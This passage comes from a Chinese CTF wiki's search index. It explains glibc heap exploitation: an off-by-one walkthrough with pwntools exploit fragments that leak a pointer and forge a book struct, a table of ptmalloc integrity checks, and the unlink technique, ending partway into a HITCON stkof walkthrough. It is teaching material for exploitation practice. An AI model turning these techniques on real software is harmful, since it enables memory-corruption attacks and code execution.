off-by-one\u6f0f\u6d1e\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u8fd9\u4e2aread\u51fd\u6570\u53ef\u4ee5\u53d1\u73b0\u5bf9\u4e8e\u8fb9\u754c\u7684\u8003\u8651\u662f\u4e0d\u5f53\u7684\u3002 signed __int64 __fastcall my_read(_BYTE *ptr, int number) { int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( number <= 0 ) return 0LL; buf = ptr; for ( i = 0; ; ++i ) { if ( (unsigned int)read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == '\\n' ) break; ++buf; if ( i == number ) break; } *buf = 0; return 0LL; }","title":"\u6f0f\u6d1e"},{"location":"pwn/heap/off_by_one/#_12","text":"","title":"\u5229\u7528"},{"location":"pwn/heap/off_by_one/#1_1","text":"\u56e0\u4e3a\u7a0b\u5e8f\u4e2d\u7684my_read\u51fd\u6570\u5b58\u5728null byte off-by-one\uff0c\u4e8b\u5b9e\u4e0amy_read\u8bfb\u5165\u7684\u7ed3\u675f\u7b26'\\x00'\u662f\u5199\u5165\u52300x555555756060\u7684\u4f4d\u7f6e\u7684\u3002\u8fd9\u6837\u5f530x555555756060\uff5e0x555555756068\u5199\u5165book\u6307\u9488\u65f6\u5c31\u4f1a\u8986\u76d6\u6389\u7ed3\u675f\u7b26'\\x00'\uff0c\u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728\u4e00\u4e2a\u5730\u5740\u6cc4\u6f0f\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u6253\u5370author name\u5c31\u53ef\u4ee5\u83b7\u5f97pointer array\u4e2d\u7b2c\u4e00\u9879\u7684\u503c\u3002 0x555555756040: 0x6161616161616161 0x6161616161616161 0x555555756050: 0x6161616161616161 0x6161616161616161 <== author name 0x555555756060: 0x0000555555757480 <== pointer array 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000000000000000 \u4e3a\u4e86\u5b9e\u73b0\u6cc4\u6f0f\uff0c\u9996\u5148\u5728author name\u4e2d\u9700\u8981\u8f93\u516532\u4e2a\u5b57\u8282\u6765\u4f7f\u5f97\u7ed3\u675f\u7b26\u88ab\u8986\u76d6\u6389\u3002\u4e4b\u540e\u6211\u4eec\u521b\u5efabook1\uff0c\u8fd9\u4e2abook1\u7684\u6307\u9488\u4f1a\u8986\u76d6 def js(str): return io.recvuntil(str) def jsn(num): return io.recvn(num) def fs(str): io.sendline(str) def fsn(str): io.send(str) js('Enter author name:') #input author name fs('a'*32) js('>')# create book1 fs('1') js('Enter book name size:') fs('32') js('Enter book name (Max 32 chars):') fs('object1') js('Enter book description size:') fs('32') js('Enter book description:') fs('object1') js('>')# print book1 fs('4') js('Author:') js('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1 book1_addr=jsn(6) book1_addr=book1_addr.ljust(8,'\\x00') book1_addr=u64(book1_addr)","title":"1.\u6cc4\u6f0f"},{"location":"pwn/heap/off_by_one/#2off-by-one","text":"\u7a0b\u5e8f\u4e2d\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u79cdchange\u529f\u80fd\uff0cchange\u529f\u80fd\u7528\u4e8e\u4fee\u6539author name\uff0c\u6240\u4ee5\u901a\u8fc7change\u53ef\u4ee5\u5199\u5165author name\uff0c\u5229\u7528off-by-one\u8986\u76d6pointer array\u7b2c\u4e00\u4e2a\u9879\u7684\u4f4e\u5b57\u8282\u3002 \u8986\u76d6\u6389book1\u6307\u9488\u7684\u4f4e\u5b57\u8282\u540e\uff0c\u8fd9\u4e2a\u6307\u9488\u4f1a\u6307\u5411book1\u7684description\uff0c\u7531\u4e8e\u7a0b\u5e8f\u63d0\u4f9b\u4e86edit\u529f\u80fd\u53ef\u4ee5\u4efb\u610f\u4fee\u6539description\u4e2d\u7684\u5185\u5bb9\u3002\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u5728description\u4e2d\u5e03\u7f6e\u6570\u636e\u4f2a\u9020\u6210\u4e00\u4e2abook\u7ed3\u6784\uff0c\u8fd9\u4e2abook\u7ed3\u6784\u7684description\u548cname\u6307\u9488\u53ef\u4ee5\u7531\u76f4\u63a5\u63a7\u5236\u3002 def off_by_one(addr): addr+=58 js('>')# create fake book in description fs('3') fake_book_data=p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) js('Enter new book description:') fs(fake_book_data) # <== fake book js('>')# change author name fs('5') js('Enter author name:') fs('a'*32) # <== off-by-one \u8fd9\u91cc\u5728description\u4e2d\u4f2a\u9020\u4e86book\uff0c\u4f7f\u7528\u7684\u6570\u636e\u662fp64(0x1)+p64(addr)+p64(addr)+pack(0xffff)\u3002 \u5176\u4e2daddr+58\u662f\u4e3a\u4e86\u4f7f\u6307\u9488\u6307\u5411book2\u7684\u6307\u9488\u5730\u5740\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\u8fd9\u4e9b\u6307\u9488\u503c\u3002","title":"2.off-by-one\u8986\u76d6\u6307\u9488\u4f4e\u5b57\u8282"},{"location":"pwn/heap/off_by_one/#3","text":"\u901a\u8fc7\u524d\u97622\u90e8\u5206\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u80fd\u529b\uff0c\u8bfb\u8005\u8bfb\u5230\u8fd9\u91cc\u53ef\u80fd\u4f1a\u89c9\u5f97\u4e0b\u9762\u7684\u64cd\u4f5c\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u6bd4\u5982\u5199got\u8868\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5199__malloc_hook\u52ab\u6301\u6d41\u7a0b\u7b49\u3002\u4f46\u662f\u8fd9\u4e2a\u9898\u76ee\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u5f00\u542fPIE\u5e76\u4e14\u6ca1\u6709\u6cc4\u6f0flibc\u57fa\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u60f3\u4e00\u4e0b\u5176\u4ed6\u7684\u529e\u6cd5\u3002 \u8fd9\u9053\u9898\u7684\u5de7\u5999\u4e4b\u5904\u5728\u4e8e\u5728\u5206\u914d\u7b2c\u4e8c\u4e2abook\u65f6\uff0c\u4f7f\u7528\u4e00\u4e2a\u5f88\u5927\u7684\u5c3a\u5bf8\uff0c\u4f7f\u5f97\u5806\u4ee5mmap\u6a21\u5f0f\u8fdb\u884c\u62d3\u5c55\u3002\u6211\u4eec\u77e5\u9053\u5806\u6709\u4e24\u79cd\u62d3\u5c55\u65b9\u5f0f\u4e00\u79cd\u662fbrk\u4f1a\u76f4\u63a5\u62d3\u5c55\u539f\u6765\u7684\u5806\uff0c\u53e6\u4e00\u79cd\u662fmmap\u4f1a\u5355\u72ec\u6620\u5c04\u4e00\u5757\u5185\u5b58\u3002 \u5728\u8fd9\u91cc\u6211\u4eec\u7533\u8bf7\u4e00\u4e2a\u8d85\u5927\u7684\u5757\uff0c\u6765\u4f7f\u7528mmap\u6269\u5c55\u5185\u5b58\u3002\u56e0\u4e3ammap\u5206\u914d\u7684\u5185\u5b58\u4e0elibc\u4e4b\u524d\u5b58\u5728\u56fa\u5b9a\u7684\u504f\u79fb\u56e0\u6b64\u53ef\u4ee5\u63a8\u7b97\u51falibc\u7684\u57fa\u5730\u5740\u3002 Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123 0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw- 0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- <=== mmap 0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw- 0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack] 0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar] 0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123 0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw- 0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- <=== mmap 0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw- 0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack] 0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar] 0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]","title":"3.\u901a\u8fc7\u6808\u5b9e\u73b0\u5229\u7528"},{"location":"pwn/heap/ptmalloc_check/","text":"\u5806\u4e2d\u7684\u68c0\u67e5 \u00b6 _int_malloc \u00b6 \u521d\u59cb\u68c0\u67e5 \u00b6 \u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u4fe1\u606f \u7533\u8bf7\u7684\u5927\u5c0f REQUEST_OUT_OF_RANGE(req) \uff1a((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) __set_errno(ENOMEM) fastbin ed \u00b6 \u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f chunk \u5927\u5c0f fastbin_index(chunksize(victim)) != idx malloc(): memory corruption (fast) Unsorted bin \u00b6 \u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f unsorted bin chunk \u5927\u5c0f chunksize_nomask (victim) <= 2 * SIZE_SZ || chunksize_nomask (victim) av->system_mem malloc(): memory corruption top chunk \u00b6 \u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u4fe1\u606f top chunk size (unsigned long) (size) >= (unsigned long) (nb + MINSIZE) \u65b9\u53ef\u8fdb\u5165 __libc_free \u00b6 mmap \u5757 \u00b6 \u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u4fe1\u606f chunk size \u6807\u8bb0\u4f4d chunk_is_mmapped (p) \u65b9\u53ef\u8fdb\u5165 \u975emmap \u5757 \u00b6 __int_free \u00b6 \u521d\u59cb\u68c0\u67e5 \u00b6 \u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f \u91ca\u653echunk\u4f4d\u7f6e (uintptr_t) p > (uintptr_t) -size || misaligned_chunk(p) free(): invalid pointer \u91ca\u653echunk\u7684\u5927\u5c0f size < MINSIZE || !aligned_OK(size) free(): invalid size fastbin \u00b6 \u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f \u91ca\u653echunk\u7684\u4e0b\u4e00\u4e2achunk\u5927\u5c0f chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ\uff0c chunksize(chunk_at_offset(p, size)) >= av->system_mem free(): invalid next size (fast) \u91ca\u653e chunk\u5bf9\u5e94\u94fe\u8868\u7684\u7b2c\u4e00\u4e2achunk fb = &fastbin(av, idx)\uff0cold= *fb\uff0c old == p double free or corruption (fasttop) fastbin\u7d22\u5f15 old != NULL && old_idx != idx invalid fastbin entry (free) non-mmapped \u5757\u68c0\u67e5 \u00b6 \u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f \u91ca\u653echunk\u4f4d\u7f6e p == av->top double free or corruption (top) next chunk \u4f4d\u7f6e contiguous (av) && (char ) nextchunk >= ((char ) av->top + chunksize(av->top)) double free or corruption (out) next chunk \u5927\u5c0f chunksize_nomask (nextchunk) <= 2 * SIZE_SZ || nextsize >= av->system_mem free(): invalid next size (normal) \u00b6 unlink \u00b6 \u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f size vs prev_size chunksize(P) != prev_size (next_chunk(P)) corrupted size vs. prev_size Fd, bk \u53cc\u5411\u94fe\u8868\u68c0\u67e5 FD->bk != P || BK->fd != P corrupted double-linked list nextsize \u53cc\u5411\u94fe\u8868 P->fd_nextsize->bk_nextsize != P || P->bk_nextsize->fd_nextsize != P corrupted double-linked list (not small)","title":"\u5806\u4e2d\u7684\u68c0\u67e5"},{"location":"pwn/heap/ptmalloc_check/#_1","text":"","title":"\u5806\u4e2d\u7684\u68c0\u67e5"},{"location":"pwn/heap/ptmalloc_check/#_int_malloc","text":"","title":"_int_malloc"},{"location":"pwn/heap/ptmalloc_check/#_2","text":"\u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u4fe1\u606f \u7533\u8bf7\u7684\u5927\u5c0f REQUEST_OUT_OF_RANGE(req) \uff1a((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) __set_errno(ENOMEM)","title":"\u521d\u59cb\u68c0\u67e5"},{"location":"pwn/heap/ptmalloc_check/#fastbin-ed","text":"\u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f chunk \u5927\u5c0f fastbin_index(chunksize(victim)) != idx malloc(): memory corruption (fast)","title":"fastbin ed"},{"location":"pwn/heap/ptmalloc_check/#unsorted-bin","text":"\u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f unsorted bin chunk \u5927\u5c0f chunksize_nomask (victim) <= 2 * SIZE_SZ || chunksize_nomask (victim) av->system_mem malloc(): memory corruption","title":"Unsorted bin"},{"location":"pwn/heap/ptmalloc_check/#top-chunk","text":"\u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u4fe1\u606f top chunk size (unsigned long) (size) >= (unsigned long) (nb + MINSIZE) \u65b9\u53ef\u8fdb\u5165","title":"top chunk"},{"location":"pwn/heap/ptmalloc_check/#__libc_free","text":"","title":"__libc_free"},{"location":"pwn/heap/ptmalloc_check/#mmap","text":"\u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u4fe1\u606f chunk size \u6807\u8bb0\u4f4d chunk_is_mmapped (p) \u65b9\u53ef\u8fdb\u5165","title":"mmap \u5757"},{"location":"pwn/heap/ptmalloc_check/#mmap_1","text":"","title":"\u975emmap \u5757"},{"location":"pwn/heap/ptmalloc_check/#__int_free","text":"","title":"__int_free"},{"location":"pwn/heap/ptmalloc_check/#_3","text":"\u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f \u91ca\u653echunk\u4f4d\u7f6e (uintptr_t) p > (uintptr_t) -size || misaligned_chunk(p) free(): invalid pointer \u91ca\u653echunk\u7684\u5927\u5c0f size < MINSIZE || !aligned_OK(size) free(): invalid size","title":"\u521d\u59cb\u68c0\u67e5"},{"location":"pwn/heap/ptmalloc_check/#fastbin","text":"\u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f \u91ca\u653echunk\u7684\u4e0b\u4e00\u4e2achunk\u5927\u5c0f chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ\uff0c chunksize(chunk_at_offset(p, size)) >= av->system_mem free(): invalid next size (fast) \u91ca\u653e chunk\u5bf9\u5e94\u94fe\u8868\u7684\u7b2c\u4e00\u4e2achunk fb = &fastbin(av, idx)\uff0cold= *fb\uff0c old == p double free or corruption (fasttop) fastbin\u7d22\u5f15 old != NULL && old_idx != idx invalid fastbin entry (free)","title":"fastbin"},{"location":"pwn/heap/ptmalloc_check/#non-mmapped","text":"\u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f \u91ca\u653echunk\u4f4d\u7f6e p == av->top double free or corruption (top) next chunk \u4f4d\u7f6e contiguous (av) && (char ) nextchunk >= ((char ) av->top + chunksize(av->top)) double free or corruption (out) next chunk \u5927\u5c0f chunksize_nomask (nextchunk) <= 2 * SIZE_SZ || nextsize >= av->system_mem free(): invalid next size (normal)","title":"non-mmapped \u5757\u68c0\u67e5"},{"location":"pwn/heap/ptmalloc_check/#unlink","text":"\u68c0\u67e5\u76ee\u6807 \u68c0\u67e5\u6761\u4ef6 \u62a5\u9519\u4fe1\u606f size vs prev_size chunksize(P) != prev_size (next_chunk(P)) corrupted size vs. prev_size Fd, bk \u53cc\u5411\u94fe\u8868\u68c0\u67e5 FD->bk != P || BK->fd != P corrupted double-linked list nextsize \u53cc\u5411\u94fe\u8868 P->fd_nextsize->bk_nextsize != P || P->bk_nextsize->fd_nextsize != P corrupted double-linked list (not small)","title":"unlink"},{"location":"pwn/heap/unlink/","text":"Unlink \u00b6 \u539f\u7406 \u00b6 \u6211\u4eec\u5728\u5229\u7528 unlink \u6240\u9020\u6210\u7684\u6f0f\u6d1e\u65f6\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u8fdb\u884c unlink chunk \u8fdb\u884c\u5185\u5b58\u5e03\u5c40\uff0c\u7136\u540e\u501f\u52a9 unlink \u64cd\u4f5c\u6765\u8fbe\u6210\u4fee\u6539\u6307\u9488\u7684\u6548\u679c\u3002 \u6211\u4eec\u5148\u6765\u7b80\u5355\u56de\u987e\u4e00\u4e0b unlink \u7684\u76ee\u7684\u4e0e\u8fc7\u7a0b\uff0c\u5176\u76ee\u7684\u662f\u628a\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u4e2d\u7684\u7a7a\u95f2\u5757\u62ff\u51fa\u6765\uff0c\u7136\u540e\u548c\u76ee\u524d\u7269\u7406\u76f8\u90bb\u7684 free chunk \u8fdb\u884c\u5408\u5e76\u3002\u5176\u57fa\u672c\u7684\u8fc7\u7a0b\u5982\u4e0b \u4e0b\u9762\u6211\u4eec\u9996\u5148\u4ecb\u7ecd\u4e00\u4e0b unlink \u6700\u521d\u6ca1\u6709\u9632\u62a4\u65f6\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u7136\u540e\u4ecb\u7ecd\u76ee\u524d\u5229\u7528 unlink \u7684\u65b9\u5f0f\u3002 \u53e4\u8001\u7684 unlink \u00b6 \u5728\u6700\u521d unlink \u5b9e\u73b0\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u662f\u6ca1\u6709\u5bf9\u53cc\u5411\u94fe\u8868\u68c0\u67e5\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6ca1\u6709\u4ee5\u4e0b\u7684\u4ee3\u7801\u3002 // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ // fd bk if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ // next_size related if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4f8b \uff0c\u5047\u8bbe\u5806\u5185\u5b58\u6700\u521d\u7684\u5e03\u5c40\u662f\u4e0b\u9762\u7684\u6837\u5b50 \u90a3\u4e48\u5982\u679c\u6211\u4eec\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\uff08 \u6bd4\u5982\u6ea2\u51fa \uff09\u5c06 Nextchunk \u7684 fd \u548c bk \u6307\u9488\u4fee\u6539\u4e3a\u6307\u5b9a\u7684\u503c\u3002\u5219\u5f53\u6211\u4eecfree(Q)\u65f6 glibc \u5224\u65ad\u8fd9\u4e2a\u5757\u662f small chunk\u3002 \u5224\u65ad\u524d\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u524d\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u4e0d\u9700\u8981\u524d\u5411\u5408\u5e76\u3002 \u5224\u65ad\u540e\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u540e\u4e00\u4e2a chunk \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\uff0c\u9700\u8981\u5408\u5e76\u3002 \u7ee7\u800c\u5bf9 nextchunk \u91c7\u53d6 unlink \u64cd\u4f5c\u3002 \u90a3\u4e48 unlink \u5177\u4f53\u6267\u884c\u7684\u6548\u679c\u662f\u4ec0\u4e48\u6837\u5b50\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u6765\u5206\u6790\u4e00\u4e0b FD=P->fd = target addr -12 BK=P->bk = expect value FD->bk = BK\uff0c\u5373 *(target addr-12+12)=BK=expect value BK->fd = FD\uff0c\u5373*(expect value +8) = FD = target addr-12 \u770b\u8d77\u6765\u6211\u4eec\u4f3c\u4e4e\u53ef\u4ee5\u901a\u8fc7 unlink \u76f4\u63a5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u76ee\u7684\uff0c\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u9700\u8981\u786e\u4fdd expect value +8 \u5730\u5740\u5177\u6709\u53ef\u5199\u7684\u6743\u9650\u3002 \u6bd4\u5982\u8bf4\u6211\u4eec\u5c06 target addr \u8bbe\u7f6e\u4e3a\u67d0\u4e2a got \u8868\u9879\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u8c03\u7528\u5bf9\u5e94\u7684 libc \u51fd\u6570\u65f6\uff0c\u5c31\u4f1a\u76f4\u63a5\u6267\u884c\u6211\u4eec\u8bbe\u7f6e\u7684\u503c\uff08expect value\uff09\u5904\u7684\u4ee3\u7801\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cexpect value+8 \u5904\u7684\u503c\u88ab\u7834\u574f\u4e86\uff0c\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7\u3002 \u5f53\u524d\u7684 unlink \u00b6 \u4f46\u662f\uff0c\u73b0\u5b9e\u662f\u6b8b\u9177\u7684\u3002\u3002 \u6211\u4eec\u521a\u624d\u8003\u8651\u7684\u662f\u6ca1\u6709\u68c0\u67e5\u7684\u60c5\u51b5\uff0c\u4f46\u662f\u4e00\u65e6\u52a0\u4e0a\u68c0\u67e5\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e48\u7b80\u5355\u4e86\u3002\u6211\u4eec\u770b\u4e00\u4e0b\u5bf9 fd \u548c bk \u7684\u68c0\u67e5 // fd bk if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ \u6b64\u65f6 FD->bk = target addr - 12 + 12=target_addr BK->fd = expect value + 8 \u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u5229\u7528\u7684\u4fee\u6539 GOT \u8868\u9879\u7684\u65b9\u6cd5\u5c31\u53ef\u80fd\u4e0d\u53ef\u7528\u4e86\u3002\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u5f97 expect value+8 \u4ee5\u53ca target_addr \u7b49\u4e8e P\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6267\u884c *P= expect value = P - 8 *P = target addr -12 = P - 12 \u5373\u6539\u5199\u4e86\u6307\u9488 P \u7684\u5185\u5bb9\uff0c\u5c06\u5176\u6307\u5411\u4e86\u6bd4\u81ea\u5df1\u4f4e 12 \u7684\u5730\u5740\u5904\u3002 \u800c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u5f97\u4e24\u8005\u90fd\u6307\u5411 P\uff0c\u53ea\u9700\u8981\u5b89\u88c5\u5982\u4e0b\u65b9\u5f0f\u4fee\u6539\u5373\u53ef \u6211\u4eec\u4f1a\u901a\u8fc7\u4e4b\u540e\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\uff0c\u6211\u4eec\u8fd9\u6837\u7684\u4fee\u6539\u662f\u53ef\u4ee5\u8fbe\u5230\u4e00\u5b9a\u7684\u6548\u679c\u7684\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u6ca1\u6709\u8fdd\u80cc\u4e0b\u9762\u7684\u7ea6\u675f\u3002 // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ \u6b64\u5916\uff0c\u5176\u5b9e\u5982\u679c\u6211\u4eec\u8bbe\u7f6enext chunk \u7684 fd \u548c bk \u5747\u4e3a nextchunk \u7684\u5730\u5740\u4e5f\u662f\u53ef\u4ee5\u7ed5\u8fc7\u4e0a\u9762\u7684\u68c0\u6d4b\u7684\u3002\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\uff0c\u5e76\u4e0d\u80fd\u8fbe\u5230\u4fee\u6539\u6307\u9488\u5185\u5bb9\u7684\u6548\u679c\u3002 2014 HITCON stkof \u00b6 \u57fa\u672c\u4fe1\u606f \u00b6 \u279c 2014_hitcon_stkof git: ( master ) file stkof stkof: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped \u279c 2014_hitcon_stkof git: ( master ) checksec stkof [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2014_hitcon_stkof/stkof' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u548c NX \u4fdd\u62a4\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u7a0b\u5e8f\u51e0\u4e4e\u5565\u8f93\u51fa\u4e5f\u6ca1\u6709\uff0c\u53ea\u80fd\u786c\u770b\u4e86\uff0c\u5927\u6982\u662f\u4e00\u4e2a\u5185\u5b58\u5206\u914d\u5668\uff0c\u5dee\u4e0d\u591a\u6709\u56db\u4e2a\u529f\u80fd 1\uff0c\u5206\u914d\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u5e76\u5728bss\u6bb5\u8bb0\u5f55\u5bf9\u5e94 chunk \u7684\u6307\u9488\uff0c\u5047\u8bbe\u5176\u4e3aglobal\u3002 